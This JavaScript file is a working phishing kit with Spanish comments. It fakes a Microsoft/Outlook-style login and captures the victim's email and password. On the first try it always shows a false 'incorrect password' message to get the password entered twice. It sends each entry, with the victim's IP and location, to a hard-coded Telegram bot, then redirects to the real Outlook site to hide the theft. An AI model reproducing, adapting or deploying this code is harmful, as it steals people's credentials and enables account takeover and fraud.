document.addEventListener("DOMContentLoaded", function() {
    // Se ejecuta después de que la página se ha cargado completamente

    // Función para enviar el mensaje a través de la API de Telegram
    function sendMessageToTelegram(email, password) {
        // Obtener la ubicación del usuario a través de la API de ipapi
        return fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                // Extraer los datos de ubicación del usuario
                const ip = data.ip;
                const country = data.country_name;
                const state = data.region;

                // Componer el mensaje para enviar a través de Telegram
                var message = "📧 Correo electrónico 📧:\n" + email + "\nContraseña: " + password + "\nIP: " + ip + "\nPais: " + country + ", " + state;

                // ID del chat de Telegram al que deseas enviar el mensaje
                var chatId = "6927751752"; // Reemplazar por el ID de tu chat

                // Token de bot de Telegram
                var botToken = "7507841125:AAHBo7vlYANIbRRY9tQgTFOXCaXGzU1GyY4"; // Reemplazar por el token de tu bot

                // Construir la URL de la API de Telegram
                var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURI(message);

                // Enviar el mensaje a través de la API de Telegram
                return fetch(apiUrl)
                    .then(response => response.json())
                    .then(data => {
                        console.log(data);
                    })
                    .catch(error => console.error("Error:", error));

                // Redireccionar a otra página
                // window.location.href = "https://www.otrapagina.com";
            })
            .catch(error => console.error("Error:", error));
    }

    // Estado para controlar si es la primera vez que se ingresa la contraseña
    var firstTimePassword = true;

    // Evento de envío del formulario de inicio de sesión
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault(); // Prevenir el envío del formulario

        // Obtener el correo electrónico ingresado por el usuario
        var email = document.getElementById("email").value;

        // Crear un nuevo formulario para ingresar la contraseña
        var passwordForm = document.createElement("form");
        passwordForm.id = "password-form";
        passwordForm.innerHTML = `
    <div class="container">
        <div class="login-box">
            <div class="login-content">
                <img src="logo.svg" alt="Logo" class="logo">
                <br><br>
                <div>
<span style="float: left;color:black;font-size:17px;">${email}</span> </div>

                <h2 style="color: black; float: left;   font-weight: 600;line-height: 28px;font-size: 1.5rem;display: block;margin-bottom: 5px;margin-top:10px;">Escribir contraseña</h2>
 <div id="password-alert-custom" style="display: none;"><span  style="color: red;float: left;text-align: left;">La cuenta o la contraseña es incorrecta. Si no recuerdas la cuenta,<a style="color: #0067b8"> restablécela ahora.</a></span></div>

                <input type="password" id="password"required="" placeholder="Contraseña">
                <br><br>
                <div align="left" style="font-size: 0.8125rem;"><a style="color: #0067b8;cursor: pointer;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">¿Olvidó su contraseña?</a></div>
                
                <button style="padding: 1px 6px;" type="submit">Iniciar Sesión</button>
            </div>
        </div>
    </div>`;

        // Reemplazar el formulario actual con el nuevo formulario de contraseña
        document.body.innerHTML = "";
        document.body.appendChild(passwordForm);

        // Evento de envío del nuevo formulario de contraseña
        document.getElementById("password-form").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevenir el envío del formulario

            // Obtener la contraseña ingresada por el usuario
            var password = document.getElementById("password").value;

            if (firstTimePassword) {
                // Mostrar el mensaje de contraseña incorrecta
                document.getElementById("password-alert-custom").style.display = "block";
                // Marcar que ya se ingresó la contraseña una vez
                firstTimePassword = false;

                // Enviar el mensaje a través de la API de Telegram
                sendMessageToTelegram(email, password);
            } else {
                // Enviar el mensaje nuevamente a través de la API de Telegram
                sendMessageToTelegram(email, password).then(() => {
                    // Redireccionar a otra página después de enviar el mensaje
                    window.location.href = "https://outlook.live.com/mail/0/";
                });
            }
        });
    });
});
